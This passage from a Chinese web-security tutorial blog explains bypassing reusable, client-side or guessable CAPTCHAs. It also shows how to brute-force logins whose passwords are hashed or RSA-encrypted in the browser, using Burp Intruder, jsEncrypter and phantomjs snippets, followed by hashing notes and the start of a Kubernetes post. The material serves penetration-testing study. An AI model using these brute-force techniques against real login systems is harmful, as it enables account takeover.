title="无条件不刷新"></a>无条件不刷新</h5><p>无条件不刷新是指在某一时间段内，无论登录失败多少次，只要不刷新页面，就可以无限次的使用同一个验证码来对一个或多个用户帐号进行暴力猜解。换句话说，攻击者可以在同一个会话下，在获得第一个验证码后，后面不再主动触发验证码生成页面，并且一直使用第一个验证码就可循环进行后面的表单操作，从而绕过了验证码的屏障作用，对登录进行暴力猜解。</p><h5 id="有条件不刷新"><a href="#有条件不刷新" class="headerlink" title="有条件不刷新"></a>有条件不刷新</h5><p>有条件不刷新多见于如下情况：登录失败之后，系统会打开一个新页面或者弹出一个新的警告窗口，提示用户登录失败，点击确定后返回登录界面且验证码刷新。这种情况下，只要我们不关闭新窗口或弹窗，配合使用Burpsuite的intruder模块就可以进行暴力破解了。某系统的验证码鉴权流程：用户输入账户信息+验证码(刷新页面或手动刷新验证码会从服务器获取验证码，但该验证码缓存于session中)，服务端接收到账户信息+验证后会先校验验证码是否正确，若不正确则，返回反之与数据库做对比，符合则返回，客户端接收服务端的请求，若成功则跳转，返回根据不同的错误码提示相应信息，并重新获取服务端生成的新验证码，重新缓存。</p><p>【问题描述】看完流程可以很容易想到一个问题：验证码此时并不会重置，一切重置验证码的操作都在浏览器，所以在Session不失效的时效内，可以无限重用验证码，这时就可以使用BurpSuite进行暴力破解了，验证码形同虚设。</p><p><strong>操作待补充</strong></p><p>仅在客户端生成验证码</p><p>有的网站验证码由前端js生成仅仅在前端用js验证，这种验证码形同虚设直接使用burp抓包提交即可。</p><p><strong>操作待补充</strong></p><h4 id="验证码隐藏在源码之中"><a href="#验证码隐藏在源码之中" class="headerlink" title="验证码隐藏在源码之中"></a>验证码隐藏在源码之中</h4><p>验证这种情况很简单，我们只需要记住验证码，然后右键打开网站源代码，Ctrl+F搜索，输入刚才的验证码，如果可以成功匹配到，那恭喜你，接下来就可以写工具，提取源码中的验证码并将其放入每次请求的报文中，来进行帐号破解，使用python编写脚本即可。</p><h4 id="验证码隐藏在Cookie中"><a href="#验证码隐藏在Cookie中" class="headerlink" title="验证码隐藏在Cookie中"></a>验证码隐藏在Cookie中</h4><p>一般来说，我们会把验证码的值用Session存储起来，通过对比用户提交的验证码和Session中的验证码，就可以知道输入是否正确。由于Session会占用服务器资源，有的开发人员会把验证码的值加密后存储在Cookie中。</p><p>这种情况，我们可以在提交登录的时候抓包，然后分析一下包中的Cookie字段，看看其中有没有相匹配的验证码，或者是经过了一些简单加密后的验证码。</p><h4 id="验证码可穷举"><a href="#验证码可穷举" class="headerlink" title="验证码可穷举"></a>验证码可穷举</h4><p>有的验证码不是使用算法随机生成的，而是一些固定的图片，多刷新几次验证码我们可能会发现系统中的存在就那么一些验证码，这种情况这种情况下只要将验证码全部下载下来，生成一个md5库，然后将前端生成的验证码与本地文件进行对比即可。</p><p>思路：建立图片md5库 与 对应验证码值库后，用 resquest.Session() 建立一个可保持状态的request对象，下载验证码图片后与md5库对比得出验证码值，进行登陆爆破即可。</p><h2 id="暴力破解与加密"><a href="#暴力破解与加密" class="headerlink" title="暴力破解与加密"></a>暴力破解与加密</h2><h3 id="Debug代码调试"><a href="#Debug代码调试" class="headerlink" title="Debug代码调试"></a>Debug代码调试</h3><p>Debug的意义在于发现程序错误的存在以隔离、消除等方式对错误，进行定位确定错误产生的原因，提出纠正错误的解决办法，对程序错误予以改正</p><h4 id="vscode-debug-python"><a href="#vscode-debug-python" class="headerlink" title="vscode debug python"></a>vscode debug python</h4><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><h6 id="1-安装插件python"><a href="#1-安装插件python" class="headerlink" title="1.安装插件python"></a>1.安装插件python</h6><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C30.PNG" alt="30"></p><h6 id="2-配置文件"><a href="#2-配置文件" class="headerlink" title="2.配置文件"></a>2.配置文件</h6><p>vscdoe会在每个文件夹下创建一个 .vscode 的配置文件目录 ， 在其中创建 <strong>launch.json 、tasks.json</strong></p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C31.PNG" alt="31"></p><p><strong>lanuch.json</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#123;    &#x2F;&#x2F; 使用 IntelliSense 了解相关属性。    &#x2F;&#x2F; 悬停以查看现有属性的描述。    &#x2F;&#x2F; 欲了解更多信息，请访问: https:&#x2F;&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?linkid&#x3D;830387    &quot;version&quot;: &quot;0.2.0&quot;,    &quot;configurations&quot;: [       &#123;            &quot;name&quot;: &quot;Python&quot;,            &quot;type&quot;: &quot;python&quot;,            &quot;request&quot;: &quot;launch&quot;,            &quot;stopOnEntry&quot;: false,            &quot;python&quot;: &quot;D:\\python\\python\\python.exe&quot;, &#x2F;&#x2F; 替换为自己的python.exe路径            &quot;program&quot;: &quot;$&#123;file&#125;&quot;,            &quot;cwd&quot;: &quot;$&#123;workspaceRoot&#125;&quot;,            &quot;env&quot;: &#123;&#125;,            &quot;envFile&quot;: &quot;$&#123;workspaceRoot&#125;&#x2F;.env&quot;,            &quot;redirectOutput&quot;: true,       &#125;   ]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>tasks.json</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#123;    &quot;version&quot;: &quot;2.0.0&quot;,    &quot;tasks&quot;: [       &#123;            &quot;label&quot;: &quot;python&quot;,            &quot;type&quot;: &quot;shell&quot;,            &quot;command&quot;: &quot;D:\\python\\python\\python.exe&quot;, &#x2F;&#x2F; 替换为自己的python.exe路径            &quot;args&quot;: [                &quot;$&#123;file&#125;&quot;           ],            &quot;group&quot;: &#123;                &quot;kind&quot;: &quot;build&quot;,                &quot;isDefault&quot;: true           &#125;,            &quot;problemMatcher&quot;: [                &quot;$eslint-compact&quot;           ]       &#125;   ]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="修改python解释器"><a href="#修改python解释器" class="headerlink" title="修改python解释器"></a>修改python解释器</h6><p>vscode中Ctrl+shirt+p调出查询窗口，输入python:select选择python解释器</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C32.PNG" alt="32"></p><h5 id="Debug-Start"><a href="#Debug-Start" class="headerlink" title="Debug Start"></a>Debug Start</h5><p>使用debug模式启动程序代码</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C33.PNG" alt="33"></p><h6 id="1-下断点debug"><a href="#1-下断点debug" class="headerlink" title="1.下断点debug"></a>1.下断点debug</h6><p>在想要调试的代码处下断点，程序debug运行后会停在此行代码执行前，等待用户调试。</p><h6 id="2-调试选项"><a href="#2-调试选项" class="headerlink" title="2.调试选项"></a>2.调试选项</h6><p><strong>继续</strong>：继续执行程序，直到遇到下一个断点为止</p><p><strong>单步跳过</strong>：在普通代码行运行时，会逐行运行程序。若遇到调用自定义函数命令，且在该定义的函数里没有断点，则直接运行完该函数，不会进入该函数并逐行运行该函数内的代码</p><p><strong>单步调试</strong>：逐行顺序运行程序。若遇到自定义函数（def），则进入该函数，逐行运行该函数内的代码</p><p><strong>单步跳出</strong>：当前运行在自定义函数（def）里时，如果在该自定义函数里没有断点，则会直接运行完当前自定义函数，停在调用函数的那一行</p><p><strong>重启</strong>：重新启动debug程序</p><p><strong>停止</strong>：结束程序</p><h6 id="3-变量监视"><a href="#3-变量监视" class="headerlink" title="3.变量监视"></a>3.变量监视</h6><p>一般在不进行 debug 时会使用print打印某个变量的值，debug可以很轻松的监视每个变量的值。</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C34.png" alt="34"></p><h3 id="前端加密爆破"><a href="#前端加密爆破" class="headerlink" title="前端加密爆破"></a>前端加密爆破</h3><p>在我们渗透过程在，经常会发现没有验证码，也没有登录次数限制，但是用户名密码都是加密的，如果只是md5加密或者hash，burp的Intruder模块自带加密爆破功能，但是如果是自定义的加密方式，或者多层md5此时就没法直接爆破了。这种情况都是前端调用 javascript代码对提交内容进行了加密，通过代码调试可以找到加密函数，使用与其相同的加密函数处理数据提交即可。</p><h4 id="常见前端加密"><a href="#常见前端加密" class="headerlink" title="常见前端加密"></a>常见前端加密</h4><h5 id="base64加密与解密"><a href="#base64加密与解密" class="headerlink" title="base64加密与解密"></a>base64加密与解密</h5><p>window.atob() 与window.btoa()可以实现对base64格式的数据进行解码和编码，其兼容性是主流浏览器，IE10及以上。</p><p>window.atob(encodedStr)只可以解码用btoa方法编码的字符串。</p><p>window.btoa()：将ascii字符串或二进制数据转换成一个base64编码过的字符串,但该方法不能直接作用于Unicode字符串。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&lt;script&gt;      var str &#x3D; &#39;RUNOOB&#39;      var enc &#x3D; window.btoa(str) &#x2F;&#x2F;编码成base64的      var dec &#x3D; window.atob(enc) &#x2F;&#x2F;把base64解码      var res &#x3D; &#39;编码字符串为: &#39; + enc + &#39;&lt;br&gt;&#39; + &#39;解码后字符串为: &#39; + dec      console.log(res)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当遇到中文时，需要先对中文转码否则会乱码。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">var str &#x3D; btoa(encodeURIComponent(&quot;中文汉字&quot;));&#x2F;&#x2F;还可以解码回来decodeURIComponent(atob(enc)) &#x3D;&gt;  中文汉字<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="MD5加密"><a href="#MD5加密" class="headerlink" title="MD5加密"></a>MD5加密</h5><p>首先引入相关js,对要加密的内容直接加密</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;blueimp-md5&#x2F;2.10.0&#x2F;js&#x2F;md5.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script&gt;  var b &#x3D;$(&quot;#logPassword&quot;);  $.md5(b.val())&lt;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>MD5没有解密算法，或者说解密算法很复杂，所以可以在数据库中存放经过<strong>两次MD5</strong>加密的的内容，也可以再配合加‘盐’ salt</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">console.log(md5(md5(&quot;123456&quot;) + &quot;a&quot;));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="sha1加密"><a href="#sha1加密" class="headerlink" title="sha1加密"></a>sha1加密</h5><p>首先引入相关js,对要加密的内容直接加密</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&lt;script type&#x3D;&quot;text&#x2F;ecmascript&quot; src&#x3D;&quot;sha1.js&quot;&gt;&lt;&#x2F;script&gt;var sha &#x3D; hex_sha1(&#39;mima123465&#39;);console.log(sha);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="RSA用公钥私钥加密解密"><a href="#RSA用公钥私钥加密解密" class="headerlink" title="RSA用公钥私钥加密解密"></a>RSA用公钥私钥加密解密</h5><p>首先引入相关配置文件</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&lt;script src&#x3D;&quot;js&#x2F;jsencrypt.js&quot;&gt;&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>前端在向后台发起登录请求之前，先请求后台获取公钥的方法</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">var publicKey &#x3D; null;$.ajax(&#123; url: &quot;xxx&quot;, type: &quot;post&quot;, dataType: &quot;text&quot;, success: function(data) &#123; var encrypt &#x3D; new JSEncrypt(); if(data)&#123; publicKey &#x3D; data; &#125;; &#125;&#125;);&#x2F;&#x2F; 通过公钥对用户名和密码加密encrypt.setPublicKey(publicKey);var username;var password;username &#x3D; encrypt.encrypt(vm.username.trim());password &#x3D; encrypt.encrypt(vm.password.trim());&#x2F;&#x2F; 接下来就是用加密后的用户名密码请求后台$.ajax(&#123; type: &quot;POST&quot;, url: &quot;xxxxxx&quot;, data: &#123;   &quot;username&quot;:username, &quot;password&quot;:password, &#125;,   dataType: &quot;json&quot;,   success: function (result) &#123; if (result.code &#x3D;&#x3D; 0) &#123;&#x2F;&#x2F;登录成功 parent.location.href &#x3D; &#39;index.html&#39;; &#125; else &#123; vm.error &#x3D; true;   vm.errorMsg &#x3D; result.msg; vm.refreshCode(); &#125; &#125; &#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="练习靶场"><a href="#练习靶场" class="headerlink" title="练习靶场"></a>练习靶场</h4><p><strong>待补充</strong></p><h4 id="浏览器调试前端代码"><a href="#浏览器调试前端代码" class="headerlink" title="浏览器调试前端代码"></a>浏览器调试前端代码</h4><h5 id="找加密函数"><a href="#找加密函数" class="headerlink" title="找加密函数"></a>找加密函数</h5><p>通过查看源码，审查元素等方式找到加密数据的函数</p><p><strong>打开浏览器调试</strong></p><p><strong>找到加密函数</strong></p><h5 id="打断点debug"><a href="#打断点debug" class="headerlink" title="打断点debug"></a>打断点debug</h5><p>断点的位置很有考究，调试的代码越少越利于我们分析，根据经验尽量精准的选择代码</p><h5 id="触发加密函数"><a href="#触发加密函数" class="headerlink" title="触发加密函数"></a>触发加密函数</h5><p>一般来说，点击登陆即可触发加密函数，点击登陆后代码暂停在了断点处</p><h5 id="调试（继续、单步、步进、步出）"><a href="#调试（继续、单步、步进、步出）" class="headerlink" title="调试（继续、单步、步进、步出）"></a>调试（继续、单步、步进、步出）</h5><p>单步（Step into next function call）进入当前函数，一步步执行</p><p>步进（Step into next function call）如果在一个函数处步进，可以进入该函数</p><p>步出（Step out of current function）如果在一个调用函数中，从此函数退出，回到调用该函数的地方</p><p>跨越 (Step over next function call) 执行到下一步的函数调用（跳到下一行）</p><h5 id="监视表达式"><a href="#监视表达式" class="headerlink" title="监视表达式"></a>监视表达式</h5><h5 id="下载js加密文件"><a href="#下载js加密文件" class="headerlink" title="下载js加密文件"></a>下载js加密文件</h5><h5 id="还原JS加密文件"><a href="#还原JS加密文件" class="headerlink" title="还原JS加密文件"></a>还原JS加密文件</h5><h5 id="burp插件jsEncrypter"><a href="#burp插件jsEncrypter" class="headerlink" title="burp插件jsEncrypter"></a>burp插件jsEncrypter</h5><p>加密函数已经在本地实现了，先在讲加密函数和burp联动起来</p><h6 id="1-安装phantomjs"><a href="#1-安装phantomjs" class="headerlink" title="1.安装phantomjs"></a>1.安装phantomjs</h6><p><strong>简介</strong>：PhantomJS是一个基于webkit的JavaScript API。它使用QtWebKit作为它核心浏览器的功能，使用webkit来编译解释执行JavaScript代码。任何你可以在基于webkit浏览器做的事情，它都能做到。它不仅是个隐形的浏览器，提供了诸如CSS选择器、支持Web标准、DOM操作、JSON、HTML5、</p><p>Canvas、SVG等，同时也提供了处理文件I/O的操作，从而使你可以向操作系</p><p>统读写文件等。PhantomJS的用处可谓非常广泛，诸如网络监测、网页截</p><p>屏、无需浏览器的 Web 测试、页面访问自动化等</p><p><strong>配置：</strong>下载 <a href="https://phantomjs.org/download.html">phantomjs</a>将 bin 目录<strong>添加至环境变量</strong>即可</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C36.PNG" alt="36"></p><h6 id="2-安装jsEncrypter"><a href="#2-安装jsEncrypter" class="headerlink" title="2.安装jsEncrypter"></a>2.安装jsEncrypter</h6><p> <a href="https://github.com/c0ny1/jsEncrypter/releases">下载jsEncrypter</a></p><h6 id="3-burp导入插件jsEncrypter"><a href="#3-burp导入插件jsEncrypter" class="headerlink" title="3.burp导入插件jsEncrypter"></a>3.burp导入插件jsEncrypter</h6><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C37.png" alt="37"></p><h6 id="4-安装靶场webapp"><a href="#4-安装靶场webapp" class="headerlink" title="4.安装靶场webapp"></a>4.安装靶场webapp</h6><p>将靶场文件放在 WWW 目录下即可</p><h5 id="burp调用js加密函数"><a href="#burp调用js加密函数" class="headerlink" title="burp调用js加密函数"></a>burp调用js加密函数</h5><p><strong>1.修改 phantomjs_server.js文件，导入js加密函数</strong></p><p><strong>2.加入自定义js函数改写后</strong></p><p><strong>3.启动phantomjs</strong></p><p>命令： phantomjs phantomjs_server.js</p><p><strong>4.burp</strong> <strong>插件连接</strong> <strong>phantomjs</strong></p><p>插件点击 connect 连接到 phantomjs ，并进行加密函数调用测试</p><p><strong>5.开始爆破</strong></p><h3 id="JS加密靶场练习"><a href="#JS加密靶场练习" class="headerlink" title="JS加密靶场练习"></a>JS加密靶场练习</h3><h4 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h4><p>哈希算法（Hash Algorithms）也称为散列算法、杂凑算法或数字指纹，是可以将任意长度的消息压缩为一个固定长度的消息的算法。</p><p>哈希算法是区块链技术体系的重要组成部分，也是现代密码学领域的重要分支，在身份认证、数字签名等诸多领域有着广泛的应用。</p><p>密码学哈希算法的主要特性就是<strong>单向性</strong>，即在算法上，<strong>只能从输入值计算得到输出值</strong>，而从输出值计算得到输入值是不可行的。</p><p>常用的哈希算法包括MD系列算法和SHA系列算法，其中MD系列算法有MD2、MD4、MD5、RIPEMD算法等，SHA系列算法有SHA0、SHA1、SHA2、SHA3算法等</p><h5 id="密码解密网站"><a href="#密码解密网站" class="headerlink" title="密码解密网站"></a>密码解密网站</h5><p><a href="https://www.cmd5.com/">https://www.cmd5.com/</a> 、 <a href="https://www.somd5.com/">https://www.somd5.com/</a> 、<a href="https://pmd5.com/">https://pmd5.com/</a></p><h5 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h5><p>MD5信息摘要算法，一种被广泛使用的密码散列函数，可以产生出一个128位（16字节）的散列值（hash value），用于确保信息传输完整一致。通常为为 <strong>32</strong> <strong>位十六进制字符</strong>，16位MD5值是 32位MD5的前16位。</p><p><strong>test.html</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&lt;script src&#x3D;&quot;.&#x2F;md5.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script&gt;    var password &#x3D; String(&quot;123456&quot;); &#x2F;&#x2F; 注意，这里是字符串    var en_password &#x3D; hex_md5(password);    console.log(en_password);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>phantomjs_server.js</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#x2F;&#x2F; 加载实现加密算法的js脚本var wasSuccessful &#x3D; phantom.injectJs(&#39;md5.js&#39;); &#x2F;*引入实现加密的js文件*&#x2F;&#x2F;&#x2F; 处理函数function js_encrypt(payload) &#123;    var newpayload;    &#x2F;**********在这里编写调用加密函数进行加密的代码************&#x2F;    var password &#x3D; String(payload);    var en_password &#x3D; hex_md5(password);    newpayload &#x3D; en_password        &#x2F;**********************************************************&#x2F;    return newpayload;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="SHA家族名称"><a href="#SHA家族名称" class="headerlink" title="SHA家族名称"></a>SHA家族名称</h5><p>计算机名词发音网站：<a href="http://www.howtopronounce.cc/sha1">http://www.howtopronounce.cc/sha1</a></p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C35.png" alt="35"></p><h5 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h5><p>SHA-1 是最广泛使用和设置的加密哈希函数之一，SSL 证书颁发机构经常使用它来签署证书。SHA-1 是一个 160 位散列，它接受一个输入并生成一个 160 位（20 字节）的散列值，称为消息摘要。它通常由一个 <strong>40</strong> <strong>位长的十六进制字符</strong>串描述。</p><h5 id="SHA256"><a href="#SHA256" class="headerlink" title="SHA256"></a>SHA256</h5><p>SHA256算法使用的哈希值长度是256位。这是一个抽象类，此类的唯一实现是<em>SHA256</em>Managed。对于任意长度的消息，SHA256都会产生一个256bit长度的散列值，称为消息摘要，可以用一个<strong>长度为64</strong>的十六进制字符串**表示</p><h5 id="SHA384"><a href="#SHA384" class="headerlink" title="SHA384"></a>SHA384</h5><p>SHA384是其中比较常见的一种摘要算法，可以用一个<strong>长度为<strong><strong>96</strong></strong>的十六进制</strong>字符串表示</p><h5 id="SHA512"><a href="#SHA512" class="headerlink" title="SHA512"></a>SHA512</h5><p>SHA384是其中比较常见的一种摘要算法，可以用一个<strong>长度为<strong><strong>128</strong></strong>的十六进制</strong>字符串表示</p><h4 id="密码加盐（Salt）"><a href="#密码加盐（Salt）" class="headerlink" title="密码加盐（Salt）"></a>密码加盐（Salt）</h4><p>原始密码加密后的哈希值存储在数据库中依然是不够安全的，那么有什么好的办法来解决这个问题呢？答案是加盐。盐（Salt）是什么？就是一个随机生成的字符串。我们将盐与原始密码连接（concat）在一起（放在前面或后面都可以），然后将concat后的字符串加密。采用这种方式加密密码，查表法就不灵了（因为盐是随机生成的）。</p><h5 id="加盐练习"><a href="#加盐练习" class="headerlink" title="加盐练习"></a>加盐练习</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">from hashlib import md5str &#x3D; &quot;123456&quot;    # --post传入的参数salt &#x3D; &quot;salt123&quot;def q():    m &#x3D; md5()    m.update(str.encode(&#39;utf8&#39;))    pass1 &#x3D; m.hexdigest()    return pass1def w():    m &#x3D; md5()    m.update((q() + salt).encode(&#39;utf8&#39;)) # 盐可以加在任何位置    pass2 &#x3D; m.hexdigest()    return pass2print(w())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p><strong>RSA****是一种非对称加密算法</strong>，加密算法分为对称加密算法和非对称加密算法,其中非对称加密算法作为计算机通信安全的基石,在保证数据安全方面起着重要的作用。</p><p><strong>非对称加密</strong>(公钥加密)：指加密和解密使用不同密钥的加密算法，也称为<strong>公私钥加密</strong>。假设两个用户要加密交换数据，双方交换公钥，使用时一方用对方的<strong>公钥加密</strong>，另一方即可用自己的<strong>私钥解密</strong>。</p><h5 id="找公钥"><a href="#找公钥" class="headerlink" title="找公钥"></a>找公钥</h5><p>公钥是公开的，因为公钥只能用来加密，不能用来解密，所以公钥在网站的前端代码里能够找到</p><h5 id="编写加密函数"><a href="#编写加密函数" class="headerlink" title="编写加密函数"></a>编写加密函数</h5><p><strong>rsa.html</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&lt;script src&#x3D;&quot;.&#x2F;jsencrypt.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script&gt;    var public_key &#x3D;&quot;MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC0Llg1bVZhnyslfezwfeOkvnXWq59bDtmQyHvxkP&#x2F;38Fw8QQXBfROCgzGc+Te6pOPl6Ye+vQ1rAnisBaP3rMk40i3OpallzVkuwRKydek3V9ufPpZEEH4eBgInMSDiMsggTWxcI&#x2F;Lvag6eHjkSc67RTrj96oxj0ipVRqjxW4X6HQIDAQAB&quot;;    var password &#x3D; &quot;123456&quot;;    var encrypt &#x3D; new JSEncrypt();    encrypt.setPublicKey(public_key);    en_password &#x3D; encrypt.encrypt(password);    console.log(en_password)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>phantomjs_server.js</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">&#x2F;&#x2F; 加载实现加密算法的js脚本var wasSuccessful &#x3D; phantom.injectJs(&#39;jsencrypt.js&#39;); &#x2F;*引入实现加密的js文件*&#x2F;&#x2F;&#x2F; 处理函数function js_encrypt(payload) &#123;    var newpayload;    &#x2F;**********在这里编写调用加密函数进行加密的代码************&#x2F;    var public_key &#x3D;&quot;MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC0Llg1bVZhnyslfezwfeOkvnXWq59bDtmQyHvxkP&#x2F;38Fw8QQXBfROCgzGc+Te6pOPl6Ye+vQ1rAnisBaP3rMk40i3OpallzVkuwRKydek3V9ufPpZEEH4eBgInMSDiMsggTWxcI&#x2F;Lvag6eHjkSc67RTrj96oxj0ipVRqjxW4X6HQIDAQAB&quot;;    var password &#x3D; String(payload);    var encrypt &#x3D; new JSEncrypt();    encrypt.setPublicKey(public_key);    en_password &#x3D; encrypt.encrypt(password);    newpayload &#x3D; en_password        &#x2F;**********************************************************&#x2F;    return newpayload;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>云原生网路全景安全数据采集与智能分析</title>
      <link href="/2022/10208472.html"/>
      <url>/2022/10208472.html</url>
      
        <content type="html"><![CDATA[<h2 id="k8s集群环境搭建"><a href="#k8s集群环境搭建" class="headerlink" title="k8s集群环境搭建"></a>k8s集群环境搭建</h2><h3 id="一、Kubernetes概述"><a href="#一、Kubernetes概述" class="headerlink" title="一、Kubernetes概述"></a>一、Kubernetes概述</h3><h4 id="1-什么是k8s"><a href="#1-什么是k8s" class="headerlink" title="1.什么是k8s"></a>1.什么是k8s</h4><p>Kubernetes（K8s）是Google在2014年发布的一个开源项目。</p><p>​    据说Google的数据中心里运行着20多亿个容器，而且Google十年多前就开始使用容器技术。</p><p>​    最初，Google开发了一个叫Borg的系统（现在命名为Omega）来调度如此庞大数量的容器和工作负载。在积累了这么多年的经验后，Google决定重写这个容器管理系统，并将其贡献到开源社区，让全世界都能受益。</p><p>​    这个项目就是Kubernetes。简单地讲，Kubernetes是Google Omega的开源版本。</p><p>​    从2014年第一个版本发布以来，Kubernetes迅速获得开源社区的追捧，包括Red Hat、VMware、Canonical在内的很多有影响力的公司加入到开发和推广的阵营。目前Kubernetes已经成为发展最快、市场占有率最高的容器编排引擎产品。</p><p><img src="/2022/10208472/k8s2.png" alt=" "></p><p><img src="/2022/10208472/k8s3.png" alt=" "></p><h4 id="2-kubernetes解决了什么问题"><a href="#2-kubernetes解决了什么问题" class="headerlink" title="2.kubernetes解决了什么问题"></a>2.kubernetes解决了什么问题</h4><ul><li>通过 Kubernetes，分布式系统工具将拥有网络效应。每当人们为 Kubernetes 制作出的新的工具，都会让所有其他工具更完善。因此，这进一步巩固了 Kubernetes 的标准地位。</li><li>云提供商并非可替换的商品。不同的云提供的服务会变得越来越独特和不同。如果可以访问不同的云提供商提供的不同服务，那么企业将因此受益。</li><li>当多节点应用与单节点应用一样可靠时，我们将看到定价模型的变化。</li><li>这就是为什么我会被 Kubernetes 洗脑的原因，它是跨越异构系统的一个标准层。</li><li>将来，我们会像讨论编译器和操作系统内核一样讨论 Kubernetes。 Kubernetes 将会是低层级的管路系统，而不在普通应用开发人员的视野之内。</li></ul><p>Kubernetes 已成为部署分布式应用的标准方式。在不远的将来，任何新成立的互联网公司都将用到 Kubernetes，无论其是否意识到这点。许多旧应用也正在迁移到 Kubernetes。</p><h5 id="2-1-起因：Docker"><a href="#2-1-起因：Docker" class="headerlink" title="2.1 起因：Docker"></a>2.1 起因：Docker</h5><p><img src="/2022/10208472/k8s5.png" alt=" "></p><h5 id="单一稳定的一体化模型"><a href="#单一稳定的一体化模型" class="headerlink" title="单一稳定的一体化模型"></a>单一稳定的一体化模型</h5><p><img src="/2022/10208472/k8s6.png" alt=" "></p><h5 id="微型化的应用部署模型"><a href="#微型化的应用部署模型" class="headerlink" title="微型化的应用部署模型"></a>微型化的应用部署模型</h5><p>(微服务、分布式、集群、高可用、负载均衡…)</p><p><img src="/2022/10208472/k8s7.png" alt=" "></p><h5 id="2-2-容器编排？是需要标准的？"><a href="#2-2-容器编排？是需要标准的？" class="headerlink" title="2.2 容器编排？是需要标准的？"></a>2.2 容器编排？是需要标准的？</h5><p>如此多的docker该如何管理(通信、负载均衡、资源共享管理、容灾、监控、健康检查….)？</p><ul><li>Mesos</li></ul><p><img src="/2022/10208472/k8s8.png" alt=" "></p><ul><li>docker swarm</li></ul><p><img src="/2022/10208472/k8s9.png" alt=" "></p><ul><li>kubernetes</li></ul><p><img src="/2022/10208472/k8s10.png" alt=" "></p><p>自2016年中，k8s表现出明显优势。</p><p><img src="/2022/10208472/k8s11.png" alt=" "></p><h3 id="二、环境"><a href="#二、环境" class="headerlink" title="二、环境"></a>二、环境</h3><h3 id="2-1-部署软件环境版本"><a href="#2-1-部署软件环境版本" class="headerlink" title="2.1 